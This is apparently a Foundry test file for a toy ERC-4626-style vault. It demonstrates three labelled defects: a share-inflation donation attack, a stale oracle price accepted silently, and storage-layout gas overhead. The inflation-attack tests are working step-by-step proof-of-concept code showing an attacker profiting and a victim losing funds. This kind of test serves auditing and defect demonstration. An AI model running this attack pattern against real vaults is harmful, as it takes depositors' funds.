// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ToyVault}      from "../src/ToyVault.sol";

// ============================================================================
// Mock ERC-20 asset token
// ============================================================================

contract MockERC20 {
    string  public name     = "Mock Token";
    string  public symbol   = "MTK";
    uint8   public constant decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount);
        balanceOf[msg.sender] -= amount;
        balanceOf[to]         += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount && allowance[from][msg.sender] >= amount);
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to]   += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

// ============================================================================
// Mock Chainlink oracle
// ============================================================================

contract MockOracle {
    int256  public answer;
    uint256 public updatedAt;
    uint80  public roundId;

    constructor(int256 answer_, uint256 updatedAt_) {
        answer    = answer_;
        updatedAt = updatedAt_;
        roundId   = 1;
    }

    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (roundId, answer, block.timestamp, updatedAt, roundId);
    }

    function setUpdatedAt(uint256 t) external { updatedAt = t; }
}

// ============================================================================
// Tests
// ============================================================================

contract ToyVaultTest is Test {
    ToyVault   vault;
    MockERC20  asset;
    MockOracle oracle;

    address constant FEE_RECIPIENT = address(0xfee);
    uint256 constant FEE_RATE      = 0;      // zero fee for clean accounting in tests

    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    function setUp() public {
        asset  = new MockERC20();
        oracle = new MockOracle(2_000e8, block.timestamp); // $2,000, fresh

        vault = new ToyVault(
            address(asset),
            address(oracle),
            FEE_RECIPIENT,
            FEE_RATE
        );
    }

    // -------------------------------------------------------------------------
    // Happy path
    // -------------------------------------------------------------------------

    function test_deposit_and_redeem() public {
        asset.mint(attacker, 1_000 ether);

        vm.startPrank(attacker);
        asset.approve(address(vault), 1_000 ether);
        uint256 shares = vault.deposit(1_000 ether, attacker);
        assertEq(shares, 1_000 ether, "first depositor: 1:1 ratio");

        uint256 received = vault.redeem(shares, attacker, attacker);
        assertEq(received, 1_000 ether, "full redeem (no fee)");
        vm.stopPrank();
    }

    // -------------------------------------------------------------------------
    // DEFECT 1: Share inflation attack
    //
    // Demonstrates that an attacker who donates directly to the vault between
    // the first deposit and a victim's deposit can force the victim's share
    // conversion to round down to zero, blocking their deposit entirely.
    // -------------------------------------------------------------------------

    // Demonstrates value extraction: attacker profits, victim loses ~10% of deposit.
    // Donation (100 ether) < victim deposit (1000 ether) so shares round to 9, not 0.
    //
    //   convertToShares(1000 ether) = 1000e18 * 1 / (100e18 + 1) = 9
    //   After victim deposit: totalAssets = 1100 ether, totalSupply = 10
    //   Attacker redeems 1/10 of pool = 110 ether  (paid 100 ether + 1 wei)
    //   Victim holds 9/10 of pool     = 990 ether  (paid 1000 ether)
    function test_DEFECT1_inflationAttack_valueExtraction() public {
        uint256 donation      = 100 ether;
        uint256 victimDeposit = 1_000 ether;

        // Step 1: Attacker deposits 1 wei, receives 1 share.
        asset.mint(attacker, 1 + donation);
        vm.startPrank(attacker);
        asset.approve(address(vault), 1);
        vault.deposit(1, attacker);
        assertEq(vault.balanceOf(attacker), 1, "attacker: 1 share");

        // Step 2: Attacker donates 100 ether directly, inflating totalAssets.
        asset.transfer(address(vault), donation);
        vm.stopPrank();

        console.log("[DEFECT 1] totalAssets after donation:", vault.totalAssets());
        console.log("[DEFECT 1] convertToShares(1000 ether):", vault.convertToShares(victimDeposit));

        // Step 3: Victim deposits 1,000 ether and receives only 9 shares
        //         (instead of the expected ~1000 in a fair vault).
        asset.mint(victim, victimDeposit);
        vm.startPrank(victim);
        asset.approve(address(vault), victimDeposit);
        uint256 victimShares = vault.deposit(victimDeposit, victim);
        vm.stopPrank();

        console.log("[DEFECT 1] Victim shares received (expected ~1000, got):", victimShares);

        // Step 4: Attacker redeems, capturing an outsized share of the pool.
        // Note: balanceOf must be read before setting the prank; vm.prank is consumed
        // by the first external call after it is set, so inlining the read inside
        // redeem(...) would consume the prank on the balanceOf and leave redeem
        // without it, triggering an allowance underflow.
        uint256 attackerShares = vault.balanceOf(attacker);
        vm.prank(attacker);
        uint256 attackerRecovered = vault.redeem(attackerShares, attacker, attacker);

        vm.prank(victim);
        uint256 victimRecovered = vault.redeem(victimShares, victim, victim);

        console.log("[DEFECT 1] Attacker invested (1 + 100 ether):", 1 + donation);
        console.log("[DEFECT 1] Attacker recovered:               ", attackerRecovered);
        console.log("[DEFECT 1] Victim invested (1000 ether):     ", victimDeposit);
        console.log("[DEFECT 1] Victim recovered:                 ", victimRecovered);

        // Attacker profits; victim sustains a material loss.
        assertGt(attackerRecovered, donation, "attacker profited from donation");
        assertLt(victimRecovered,   victimDeposit, "victim lost funds");
    }

    // -------------------------------------------------------------------------
    // DEFECT 1 (variant): victim deposit reverts with very large donation.
    // -------------------------------------------------------------------------

    function test_DEFECT1_inflationAttack_victimReverts() public {
        uint256 donation = 1_000_000 ether;  // 1M tokens donated

        asset.mint(attacker, 1 + donation);
        vm.startPrank(attacker);
        asset.approve(address(vault), 1);
        vault.deposit(1, attacker);
        asset.transfer(address(vault), donation);
        vm.stopPrank();

        // victim deposits 1,000 tokens; convertToShares rounds to 0.
        asset.mint(victim, 1_000 ether);
        vm.startPrank(victim);
        asset.approve(address(vault), 1_000 ether);
        vm.expectRevert("ToyVault: zero shares minted");
        vault.deposit(1_000 ether, victim);
        vm.stopPrank();
        console.log("[DEFECT 1] Victim deposit reverted (0 shares minted after large donation).");
    }

    // -------------------------------------------------------------------------
    // DEFECT 2: Stale oracle is accepted silently.
    //
    // After the oracle feed stops updating, assetPrice() continues to return
    // the last committed price with no error. A correctly implemented check
    // would revert once updatedAt falls outside the staleness window.
    // -------------------------------------------------------------------------

    function test_DEFECT2_staleOracle() public {
        // Advance time 25 hours; oracle does not update.
        vm.warp(block.timestamp + 25 hours);
        oracle.setUpdatedAt(block.timestamp - 25 hours); // explicitly stale

        // assetPrice() succeeds -- no staleness revert.
        uint256 price = vault.assetPrice();
        assertTrue(price > 0, "stale price returned without revert");

        console.log("[DEFECT 2] Oracle last updated 25 hours ago.");
        console.log("[DEFECT 2] assetPrice() returned:", price, "(should have reverted).");
    }

    // -------------------------------------------------------------------------
    // DEFECT 3: Storage layout -- gas cost proof.
    //
    // Reading oracle, depositsPaused, withdrawsPaused, and feeRate from cold
    // storage pays four separate cold SLOADs (4 * 2,100 = 8,400 gas). With
    // optimal packing, oracle + depositsPaused + withdrawsPaused fit in one
    // slot, reducing this to two cold SLOADs (4,200 gas): a 50 % saving on
    // configuration reads. The gas snapshot will reflect this overhead.
    // -------------------------------------------------------------------------

    function test_DEFECT3_storageLayout_gasOverhead() public view {
        // Access four fields that would fit in two packed slots.
        address o = vault.oracle();
        bool    d = vault.depositsPaused();
        bool    w = vault.withdrawsPaused();
        uint256 r = vault.feeRate();

        // Suppress unused-variable warnings while keeping all four SLOADs.
        assertTrue(
            o != address(1) || !d || !w || r < type(uint256).max,
            "unreachable: prevents dead-code elimination"
        );
        console.log("[DEFECT 3] Four cold SLOADs for fields that could fit in 2 slots.");
    }

    // -------------------------------------------------------------------------
    // Fuzz: deposit / redeem round-trip (no inflation setup).
    // -------------------------------------------------------------------------

    function testFuzz_depositRedeem_roundTrip(uint128 amount) public {
        amount = uint128(bound(amount, 1 ether, 1_000_000 ether));

        asset.mint(address(this), amount);
        asset.approve(address(vault), amount);
        uint256 shares = vault.deposit(amount, address(this));

        uint256 recovered = vault.redeem(shares, address(this), address(this));
        // With zero fee and no other depositors, recovered == amount.
        assertEq(recovered, amount, "round-trip invariant");
    }
}
